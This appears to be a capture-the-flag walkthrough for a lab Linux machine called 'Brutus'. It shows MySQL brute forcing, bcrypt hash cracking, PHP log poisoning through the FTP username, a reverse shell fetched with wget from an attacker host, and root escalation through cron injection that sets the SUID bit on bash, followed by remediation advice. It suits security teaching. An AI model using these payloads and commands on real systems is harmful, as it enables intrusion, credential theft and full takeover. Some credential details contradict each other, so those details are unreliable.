## Brutus

Medium-difficulty Linux machine exploitation through MySQL enumeration, log poisoning, database credential extraction, and SUID binary privilege escalation.

**Target:** 10.48.129.40 (brutus)  
**Attack Vector:** MySQL → Web Application → Log Poisoning → RCE → SUID Escalation  
**Difficulty:** Intermediate  

---

### RECONNAISSANCE

**Port Enumeration**

```
21/tcp   FTP       vsftpd 3.0.5
22/tcp   SSH       OpenSSH 8.2p1 Ubuntu
80/tcp   HTTP      Apache 2.4.41 (Ubuntu)
3306/tcp MySQL     MySQL 8.0.41
```

**Service Analysis**

Exposed MySQL database, login portal on HTTP, FTP service available. MySQL enumeration reveals multiple valid usernames with empty passwords—significant security misconfiguration.

---

### ENUMERATION PHASE

**WEB APPLICATION DISCOVERY**

```
gobuster dir -u http://10.48.129.40/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,sql,bak,json
```

Identified endpoints:
```
/index.php       (Status: 200) - Login page
/welcome.php     (Status: 302) - Redirects to login
/logout.php      (Status: 302) - Logout handler
/config.php      (Status: 200) - Configuration file
```

Login portal requires credentials. No public bypass or default credentials identified.

**MYSQL ENUMERATION**

```
nmap -p 3306 --script mysql-enum 10.48.129.40
```

**Valid MySQL Usernames Discovered**

```
root         (empty password)
netadmin     (empty password)
guest        (empty password)
user         (empty password)
test         (empty password)
sysadmin     (empty password)
administrator (empty password)
webadmin     (empty password)
admin        (empty password)
web          (empty password)
```

Multiple default accounts without password protection. Critical authentication bypass.

**MYSQL CREDENTIAL BRUTE FORCE**

```
hydra -L names.txt -P /usr/share/wordlists/rockyou.txt mysql://10.48.129.40 -t 4 -I
```

**Credentials Obtained:**

```
Username: root
Password: rockyou
```

---

### DATABASE EXPLOITATION

**MYSQL CONNECTION**

```
mysql -u root -h 10.48.129.40 -p rockyou
```

**DATABASE ENUMERATION**

```
show databases;
```

Databases:
```
information_schema
mysql
performance_schema
sys
website
```

Target: `website` database—application-specific data.

**TABLE ENUMERATION**

```
use website;
show tables;
select * from users;
```

**Users Table Contents**

```
id: 1
username: Adrian
password: $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we
created_at: 2021-10-20 02:43:42
```

Bcrypt hash recovered from database. Single user account identified.

**BCRYPT HASH CRACKING**

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Credentials Obtained:**

```
Username: Adrian
Password: tigger
```

---

### WEB APPLICATION ACCESS

**LOGIN TO PORTAL**

```
Username: Adrian
Password: tigger
```

Authenticated successfully. Application grants access to log viewer functionality.

**LOG FILE ACCESS**

Application displays access logs. Adrian user can view FTP and HTTP request logs—includes usernames, IP addresses, and commands.

---

### EXPLOITATION - LOG POISONING

**FTP LOG POISONING VECTOR**

FTP login attempt records username in log file. By injecting PHP code into FTP username field, code executes when log is viewed through application.

**POISON INJECTION**

Connect to FTP and inject PHP payload in username:

```
ftp 10.48.129.40
Name: <?=`$_GET[0]`?>
```

PHP code embedded in FTP login attempt. When viewed through web application, code executes with www-data privileges.

**CODE EXECUTION VERIFICATION**

Access poisoned log through web application with query parameter:

```
http://10.48.129.40/logs.php?0=whoami
```

Log displays output: `www-data`

---

### REMOTE CODE EXECUTION

**REVERSE SHELL ACQUISITION**

Direct reverse shell execution blocked. Implement two-stage payload:

**Stage 1: Download Shell**

```
http://10.48.129.40/logs.php?0=wget+http://192.168.158.30/shell.php
```

Wget downloads `shell.php` from attacker server to target system.

**HTTP Server Setup**

```
python3 -m http.server 80
```

Server logs show successful file transfer:
```
10.48.129.40 - - [14/Oct/2026 03:09:23] "GET /shell.php HTTP/1.1" 200
```

**Stage 2: Execute Shell**

```
http://10.48.129.40/logs.php?0=php+shell.php
```

Executes uploaded reverse shell script.

**REVERSE SHELL ESTABLISHMENT**

```
nc -lvnp 4445
connect to [192.168.158.30] from (UNKNOWN) [10.48.129.40] 40628
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Remote code execution as www-data user. Interactive shell established.

**SHELL STABILIZATION**

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Upgrade to full TTY shell. Enables job control and terminal manipulation.

---

### USER PRIVILEGE ESCALATION

**ADRIAN HOME DIRECTORY ENUMERATION**

```
ls -lah /home/adrian
```

Contents:
```
.bash_history       → /dev/null (cleared)
.reminder           (hint file)
punch_in            (log file)
punch_in.sh         (cron script)
user.txt            (flag)
```

**.REMINDER FILE ANALYSIS**

```
cat .reminder
Rules:
best of 64
+ exclamation

ettubrute
```

Contains password generation rules for John the Ripper and wordlist: `ettubrute`

This is a hint for privilege escalation password generation.

**PUNCH_IN.SH SCRIPT ANALYSIS**

```bash
#!/bin/bash
/usr/bin/echo 'Punched in at '$(/usr/bin/date +"%H:%M") >> /home/adrian/punch_in
```

Script appends timestamp to punch_in file. Likely executed by cron job at regular intervals.

**PUNCH_IN LOG SCRIPT ANALYSIS**

Script that reads punch_in file line by line:

```sh
#!/bin/sh
while read line;
do
  /usr/bin/sh -c "echo $line";
done < /home/adrian/punch_in
```

Each line in punch_in executed as shell command. If we inject bash command, it executes with elevated privileges.

**GENERATE CANDIDATE PASSWORDS**

Use John the Ripper rules on provided wordlist:

```
john --wordlist=word.txt --rules=best64 --stdout > passwords
```

Generates variations of `ettubrute` with best64 rules and exclamation additions:
```
ettubrute!
ettubrutE!
ettubrute1!
[additional variations]
```

**SSH BRUTE FORCE WITH GENERATED PASSWORDS**

```
hydra -l adrian -P passwords ssh://10.48.129.40
```

**Credentials Obtained:**

```
Username: adrian
Password: theettubrute!
```

---

### ROOT PRIVILEGE ESCALATION

**SSH ACCESS AS ADRIAN**

```
ssh adrian@10.48.129.40
Password: theettubrute!
```

User adrian authenticated successfully.

**PUNCH_IN FILE MANIPULATION**

Adrian user can write to punch_in file. Since punch_in script executes file contents as shell commands, inject privilege escalation command:

```
echo '`chmod +s /bin/bash`' >> /home/adrian/punch_in
```

Inject command to set SUID bit on /bin/bash. When punch_in script executes (via cron), command runs with elevated privileges.

**SUID BASH VERIFICATION**

Wait for cron execution. Check bash SUID status:

```
ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

SUID bit set. Bash now executes as root.

**ROOT SHELL SPAWNING**

```
/bin/bash -p
bash-5.0# whoami
root
```

Execute bash with -p flag (preserve privileges). Gain root shell.

**SYSTEM FLAG**

```
cat /root/root.txt
[flag obtained]
```

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Port enumeration
  ├─ Service version detection
  └─ Web application identification

PHASE 2: MySQL Enumeration
  ├─ Username enumeration (10 default accounts)
  ├─ Default credentials identification
  ├─ Hydra brute force
  └─ Credentials: root:rockyou

PHASE 3: Database Access
  ├─ Connect to MySQL
  ├─ Enumerate databases
  ├─ Extract user credentials from website.users
  └─ Bcrypt hash obtained

PHASE 4: Hash Cracking
  ├─ John the Ripper analysis
  ├─ Dictionary attack
  └─ Adrian:tigger credentials

PHASE 5: Web Application Access
  ├─ Authenticate as Adrian
  ├─ Access log viewer
  └─ Identify log poisoning vector

PHASE 6: Log Poisoning RCE
  ├─ FTP login username injection
  ├─ PHP code embedding
  ├─ Log execution trigger
  └─ www-data code execution

PHASE 7: Reverse Shell
  ├─ Two-stage payload (wget + execute)
  ├─ Shell upload
  ├─ Reverse connection
  └─ www-data shell established

PHASE 8: User Privilege Escalation
  ├─ Adrian home directory enumeration
  ├─ .reminder file analysis (password hints)
  ├─ John the Ripper rule generation
  ├─ SSH brute force with generated passwords
  └─ Adrian SSH access

PHASE 9: Root Privilege Escalation
  ├─ Identify punch_in execution path
  ├─ Inject SUID bash command
  ├─ Cron execution trigger
  ├─ Bash SUID bit set
  └─ Root shell achieved
```

---

### VULNERABILITIES

**CRITICAL ISSUES**

1. **MySQL Default Credentials (CVSS 9.8)**
   - Multiple default accounts with empty passwords
   - Root access achievable without authentication
   - Database exposes application user credentials

2. **Weak Web Application Password (CVSS 7.2)**
   - Adrian password "tigger" in rockyou.txt (rank 25,063)
   - No account lockout policy
   - Brute force successful within seconds

3. **Log Poisoning via FTP (CVSS 8.8)**
   - FTP username field not sanitized
   - PHP code injected via login attempt
   - Code executes in web application context

4. **Cron Command Injection (CVSS 9.1)**
   - punch_in file user-writable
   - Script executes file contents as shell commands
   - No input validation or escaping
   - Privilege escalation to cron execution user

5. **Weak Password Generation (CVSS 6.2)**
   - .reminder file contains password hints
   - Wordlist embedded in user home directory
   - John rules applied trivially to generate credentials

---

### REMEDIATION

```
IMPLEMENT:
├─ MySQL Security
│  ├─ Remove default accounts
│  ├─ Enforce strong password policies
│  ├─ Disable network access (localhost only)
│  ├─ Implement role-based access control
│  └─ Regular credential audits
│
├─ Web Application Security
│  ├─ Sanitize all user input
│  ├─ Implement FTP username validation
│  ├─ Escape PHP output rendering
│  ├─ Implement account lockout (5 attempts, 15 min)
│  └─ Use parameterized queries
│
├─ Cron Job Security
│  ├─ Validate input before execution
│  ├─ Use whitelisting for allowed commands
│  ├─ Restrict file permissions (chmod 600)
│  ├─ Remove SUID bits from unnecessary binaries
│  └─ Monitor cron execution logs
│
├─ Authentication
│  ├─ Enforce minimum 14-character passwords
│  ├─ Remove password hints from user directories
│  ├─ Implement MFA for SSH access
│  └─ Monitor failed login attempts
│
└─ Detection & Monitoring
   ├─ Alert on MySQL default account access
   ├─ Monitor log injection attempts
   ├─ Track cron command modifications
   └─ Implement file integrity monitoring
```

---

### TECHNICAL NOTES

**Tools Used:**
- nmap (port/service enumeration)
- gobuster (web directory discovery)
- hydra (MySQL and SSH brute force)
- john (bcrypt hash cracking, rule generation)
- MySQL client (database queries)
- FTP client (log poisoning)

**Attack Complexity:** Medium  
**Exploitation Duration:** 90-120 minutes  
**Key Insight:** Multiple weak security controls enable privilege escalation chain

**Privilege Escalation Path:**
- www-data (log poisoning RCE) → adrian (password generation via hints) → root (cron command injection)
